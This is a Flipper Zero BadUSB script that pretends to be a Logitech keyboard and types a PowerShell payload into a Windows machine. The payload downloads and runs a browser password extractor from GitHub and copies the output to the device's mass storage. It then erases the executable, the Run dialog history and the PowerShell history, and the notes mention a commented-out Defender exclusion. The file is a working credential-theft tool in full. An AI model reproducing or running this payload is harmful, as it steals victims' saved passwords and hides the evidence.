//NOTES: Increased delay times and commented out "Add-MpPreference -ExclusionPath $currentDirectory.Path;",    In order to avoid an error that was popping up due to not running as ADMIN - 07/3/2024 - 1349hrs.
//Also removed /*Remove-MpPreference -ExclusionPath $currentDirectory.Path;*/ SUCCESS! - 07/3/2024 - 1349hrs.


// Requirements
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

// Mass storage details
let image = "/ext/apps_data/mass_storage/edge_loot8mb_2056.img";
let size = 8 * 2056 * 2056; // 8 MB

// PowerShell script
let script = [
    "$currentDirectory = Get-Location;",
    //"Add-MpPreference -ExclusionPath $currentDirectory.Path;",
    "$Date = Get-Date -Format yyyy-MM-dd;",//Get Date
    "$Time = Get-Date -Format hh-mm-ss;",//Get Time
    "$exeUrl = 'https://github.com/RiadZX/FlipperPasswordExtractor/raw/master/build/edge.exe';", // URL of the executable
    "$exePath = '.\\edge.exe';", // Path where the executable will be saved in the current directory
    "if (-not (Test-Path -Path $exePath)) {Invoke-WebRequest -Uri $exeUrl -OutFile $exePath;}", // Download the executable if it doesn't exist
    "$commandOutput = & \"$exePath\" | Out-String;", // Execute the command and capture the output
    "$fileName = '.\\edge.txt';", //Output filename
    "$commandOutput | Out-File -FilePath $fileName;", // Save the output to a file
];


// Script crawler
let command = "";
for (let i = 0; i < script.length; i++) {
    command += script[i];
}

// Check if mass storage already exists
print("Checking for Image...");
if (storage.exists(image)) {
    print("Storage Exists.");
} else {
    print("Creating Storage...");
    usbdisk.createImage(image, size);
}

// VID & PID as HID
badusb.setup({
    vid: 0xAAAA,
    pid: 0xBBBB,
    mfr_name: "Logitech",
    prod_name: "KeyBoard",
    layout_path: "/ext/badusb/assets/layouts/en-US.kl"
});

print("Waiting for connection");
while (!badusb.isConnected()) {
    delay(1000);
}

badusb.press("GUI", "x");//Open admin tools menu
	delay(300);
badusb.press("i");//Select PowerShell
	delay(4500);

print("Running payload");
badusb.println(command, 1);//Run Script Crawler
delay(9000);
delay(5000);
delay(5000);

badusb.println("Start-Sleep -seconds 20; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\; Move-Item -Path edge.txt -Destination ${DriveLetter}:\\${Date}\\${env:computername}_${Time}.txt; Remove-Item edge.exe; $currentDirectory = Get-Location; /*  */ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue; exit")
badusb.quit();
delay(2000);
usbdisk.start(image);//Open MassStorage Folder
print("Please wait until powershell closes to eject");
delay(9000);
delay(9000);
delay(9000);
delay(9000);
delay(9000);
delay(9000);

// Wait for user to eject the mass storage
while (!usbdisk.wasEjected()) {
    delay(1000);
}

// Stop the script
usbdisk.stop();
print("Done");


